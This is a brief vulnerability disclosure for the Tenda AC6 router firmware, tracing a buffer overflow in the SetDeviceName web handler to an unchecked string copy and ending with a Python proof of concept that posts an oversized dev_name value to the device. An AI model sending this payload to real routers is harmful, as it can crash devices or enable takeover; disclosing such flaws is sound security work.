# buffer overflow

## Tenda_AC6

version: V15.03.06.51

## Description:

There is a buffer overflow in httpd/SetDeviceName

## Source:

you may download it from : https://www.tendacn.com/download/detail-3794.html

## Analyse:


![](2.png)

get value from devName ,send to set_device_name

![](3.png)

and dont send the mac ,we can get into else

finally call snprint ,dont check the length ,cause buff overflow



## POC
```
url = "http://192.168.1.13/goform/SetDeviceName"
payload = 'A'*0x1000 + '\n'

r = requests.post(url, data={'dev_name': payload})
``` 
